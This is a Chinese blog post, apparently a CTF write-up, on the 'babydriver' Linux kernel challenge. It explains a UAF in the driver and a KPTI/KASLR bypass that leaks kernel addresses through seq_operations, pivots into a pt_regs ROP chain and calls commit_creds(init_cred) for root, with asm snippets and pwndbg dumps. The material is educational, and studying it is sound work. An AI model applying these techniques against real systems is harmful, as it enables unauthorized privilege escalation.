<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="babydriver 先进行解压： 12mv rootfs.cpio rootfs.cpio.gz gunzip rootfs.cpio.gz  这个 rootfs.cpio 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压  123#!&#x2F;bin&#x2F;bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="seq_operations+pt_regs">
<meta property="og:url" content="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:description" content="babydriver 先进行解压： 12mv rootfs.cpio rootfs.cpio.gz gunzip rootfs.cpio.gz  这个 rootfs.cpio 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压  123#!&#x2F;bin&#x2F;bashqemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &amp;">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2023-02-19T11:26:43.000Z">
<meta property="article:modified_time" content="2023-04-02T06:53:53.984Z">
<meta property="article:author" content="yhellow">
<meta property="article:tag" content="pt_regs">
<meta property="article:tag" content="seq_operations">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>seq_operations+pt_regs | Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          seq_operations+pt_regs
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-19 19:26:43" itemprop="dateCreated datePublished" datetime="2023-02-19T19:26:43+08:00">2023-02-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-04-02 14:53:53" itemprop="dateModified" datetime="2023-04-02T14:53:53+08:00">2023-04-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong>babydriver</strong></p>
<p>先进行解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz </span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>rootfs.cpio</code> 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>伪条件竞争引发的 UAF 漏洞，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(fp, command);</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(arg, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = arg;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以再释放后再申请（改写大小）</li>
</ul>
<p>babydriver 是我们入门内核的第一道题目，现在来看看它的两个变种</p>
<p><strong>变种一：添加 KPTI 和 kaslr</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 pti=on kaslr&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
<li>kaslr</li>
<li>KPTI（在 <code>append</code> 中添加 <code>pti=on</code>）</li>
</ul>
<p>KPTI（Kernel Page Table Isolation）就是内核页表隔离（内核版本 4.15 以上），使内核与用户态进程使用两套独立的页表</p>
<ul>
<li>在 Linux 中，寄存器 CR3 用于存储当前的 PGD 地址（四级页表结构：<code>PGD-&gt;PUD-&gt;PMD-&gt;PTE</code>）</li>
<li>如果开启了 KPTI，则在内核态与用户态切换时会同时切换 CR3 </li>
<li>为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址）</li>
<li>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</li>
</ul>
<p>KPTI：会使 <code>ret2usr</code> 失效，在用户空间中构造 <code>fake tty_operations</code> 也会失效，在 ROP 中需要切换 CR3 的 gadget</p>
<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
</ul>
<p>结构体 <code>pt_regs</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15</li>
<li>只需要寻找到一条形如 <code>add rsp, val; ret</code> 的 gadget 便能够完成 ROP</li>
</ul>
<p>于是泄露思路如下：</p>
<ul>
<li>先执行两次 <code>open(&quot;/dev/babydev&quot;, O_RDWR)</code></li>
<li>执行 <code>ioctl(fd[0], 0x10001, 0x20)</code>，修改内核结构体的大小为 0x20（使 <code>seq_operations</code> 可以被放入这里）</li>
<li>释放 <code>fd[0]</code>，并且执行 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>（内核结构体被释放，又被申请回来存放 <code>seq_operations</code>）</li>
<li>此时 <code>fd[1]</code> 仍然指向内核结构体，于是用 <code>read(fd[1], leak_data, 0x10)</code> 泄露内核基地址</li>
</ul>
<p>使用如下命令来查找需要的偏移：（使用前先关闭 kaslr，并开启 root 权限）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep commit_creds</span></span><br><span class="line">ffffffff810a1420 T commit_creds</span><br><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep init_cred</span></span><br><span class="line">ffffffff81e48c60 D init_cred</span><br></pre></td></tr></table></figure>
<p>接下来需要把 <code>seq_operations-&gt;start</code> 覆盖为一个 gadget（类似于 <code>add rsp, offset;...; ret;</code>）</p>
<p>在开启 KPTI 内核，提权返回到用户态（<code>iretq/sysret</code>）之前如果不设置CR3寄存器的值，就会导致进程找不到当前程序的正确页表，引发段错误</p>
<p>常规设置需要从上到下执行3个 gadget：（改写 CR3 的第13位）</p>
<ul>
<li><code>pop rdi; ret;</code>（RDI 写入 <code>0x6f0</code>）</li>
<li><code>mov cr4, rdi; ret;</code></li>
<li><code>swapgs; pop rbp; ret;</code></li>
</ul>
<p>使用 <code>pt_regs</code> 在内核态写 ROP 链，就没有那么多空间来放入 gadget，于是我们用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数一次搞定（低版本的内核没有这个函数）</p>
<ul>
<li>需要的栈布局如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>
<ul>
<li>只要把 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> 放在 R10 的位置就可以符合条件</li>
</ul>
<p>综合上面的内容，我们可以得到劫持控制流的思路：</p>
<ul>
<li>执行 <code>write(fd[1], &amp;magic_addr, 8)</code> 写入形如 <code>add rsp, 0x148; ...; ret;</code> 的 gadget</li>
<li>通过 <code>pt_regs</code> 构造 ROP 链（R10 写上 <code>swapgs_restore_regs_and_return_to_usermode + 22</code>）</li>
<li>在 gadget 打上断点，然后计算该 gadget 到 <code>pt_regs</code> 结构体的偏移，寻找准确的 gadget</li>
</ul>
<p>在实际的调试中，我发现 <code>pt_regs</code> 的内容没有那么规整（可能是 sys_read 破坏了 <code>pt_regs</code> 原本的结构），下面给一个调试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span> </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>GDB 部分内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8800027cbdd8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffff8800027cbdd8</span> —▸ <span class="number">0xffffffff8122fab8</span> ◂— mov    r15, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff8800027cbde0</span> —▸ <span class="number">0xffffffff810ee6a9</span> ◂— <span class="keyword">xor</span>    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff8800027cbde8</span> —▸ <span class="number">0x7fff99311170</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff8800027cbdf0</span> —▸ <span class="number">0xffff88000276c1c0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff8800027cbdf8</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rsi <span class="number">0xffff8800027cbe00</span> ◂— <span class="number">0</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0xffff8800027cbe38</span> ◂— push   rbp <span class="comment">/* 0x55555555; &#x27;UUUU&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│ rbp <span class="number">0xffff8800027cbe40</span> —▸ <span class="number">0xffff8800027cbec8</span> —▸ <span class="number">0xffff8800027cbf00</span> —▸ <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0xffff8800027cbe48</span> —▸ <span class="number">0xffffffff8120ad17</span> ◂— mov    rdi, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0xffff8800027cbe50</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x20000 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│ r12 <span class="number">0xffff8800027cbf18</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0xffff8800027cbf20</span> ◂— adc    byte ptr [rdi], cl <span class="comment">/* 0xfdb69a886c1b0f10 */</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0xffff8800027cbf28</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0xbbbb2222 */</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0xffff8800027cbf30</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0x22222222; &#x27;&quot;&quot;&quot;&quot;&#x27; */</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0xffff8800027cbf38</span> ◂— <span class="keyword">xor</span>    esi, dword ptr [rbx] <span class="comment">/* 0x33333333; &#x27;3333&#x27; */</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│     <span class="number">0xffff8800027cbf40</span> ◂— add    byte ptr [rax], r8b <span class="comment">/* 0x44444444; &#x27;DDDD&#x27; */</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│     <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│     <span class="number">0xffff8800027cbf50</span> —▸ <span class="number">0xffffffff81819c32</span> ◂— mov    qword ptr [rsp + <span class="number">0x50</span>], rax</span><br><span class="line">    ......</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0xffff8800027cbf90</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x11110000 */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0xffff8800027cbf98</span> ◂— cdq     <span class="comment">/* 0x99999999 */</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0xffff8800027cbfa0</span> ◂— mov    byte ptr [rax + <span class="number">0x8888</span>], cl <span class="comment">/* 0x88888888 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>0xbbbb2222 -&gt; 0xbbbb1111</code> 和 <code>0x11110000 -&gt; 0x88888888</code></li>
<li>ROP 的构造思路：<ul>
<li>在 <code>0xbbbb2222-0x33333333</code> 分别放入 <code>pop_rdi_ret</code> <code>init_cred</code> <code>commit_creds</code></li>
<li>在 <code>0x44444444</code> 放入 <code>add_rsp_offset_ret</code> 以跳转到 <code>0x11110000</code></li>
<li>在 <code>0x11110000</code> 中放入 <code>swapgs_restore_regs_and_return_to_usermode + 22</code></li>
<li>在 <code>seq_operations-&gt;start</code> 中写入的 gadget 需要把栈迁移的 ROP 链上</li>
</ul>
</li>
</ul>
